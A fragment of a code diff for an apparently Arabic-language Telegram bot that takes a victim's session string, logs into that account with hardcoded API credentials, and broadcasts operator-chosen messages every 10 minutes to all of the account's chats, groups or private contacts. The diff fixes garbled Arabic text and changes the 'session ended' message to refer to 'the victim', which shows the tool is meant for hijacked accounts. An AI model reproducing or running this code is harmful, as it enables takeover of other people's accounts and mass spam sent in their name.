-        await event.respond("Ø§Ø±Ø³Ù„ Ø§Ù„Ù…Ø´ÙƒÙ„Ù‡ Ø§Ù„Ù‰ Ù„Ø­Ù„Ù‡Ø§- @N_B_1\n**LOGS**\n" + str(e))
+        await event.respond("ارسل المشكلة لحلها الى @lMl10l\n**LOGS**\n" + str(e))
 
 
 
@@ -626,7 +625,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("Ø§Ù„Ù…Ø§Ù„Ùƒ", "https://t.me/N_B_1")
+        Button.url("القناة", "https://t.me/Jepthon")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
@@ -674,18 +673,18 @@ async def gcasta(strses, msg):
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل لي الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡")
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرسالة")
       msg = await x.get_response()
-      await x.send_message("Ø§Ù„Ø§Ù† ØªÙ… Ø³ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡ Ø¨Ø´ÙƒÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 10 Ø¯Ù‚Ø§Ø¦Ù‚")
+      await x.send_message("الان سيتم ارسال رسالة بشكل تلقائي كل 10 دقائق ")
       i = await gcasta(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} all ðŸ˜—ðŸ˜—.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} all 😉😉.", buttons=keyboard)
 
 molb = True
 
@@ -798,18 +797,18 @@ async def gcastb(strses, msg):
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø¹Ø·ÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡")
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرسالة")
       msg = await x.get_response()
-      await x.send_message("Ø§Ù„Ø§Ù† ØªÙ… Ø³ÙˆÙ ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡ ÙƒÙ„ 10 Ø¯Ù‚Ø§Ø¦Ù‚ Ø¨Ø´ÙƒÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ")
+      await x.send_message("الان سيتم ارسال الرسالة بشكل تلقائي كل 10 دقائق")
       i = await gcastb(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Group ðŸ˜—ðŸ˜—.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} Group 😉😉.", buttons=keyboard)
 
 async def gcastc(strses, msg):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -833,18 +832,18 @@ async def gcastc(strses, msg):
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø¹Ø·Ù†ÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡")
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("الان ارسل لي الرساله")
       msg = await x.get_response()
-      await x.send_message("Ø§Ù„Ø§Ù† ØªÙ… Ø³ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡ Ø¨Ø´ÙƒÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 10 Ø¯Ù‚Ø§Ø¦Ù‚")
+      await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
       i = await gcastc(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} PrivateðŸ˜—ðŸ˜—.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} Private 😉😉.", buttons=keyboard)
 
 
 tgbot.run_until_disconnected()
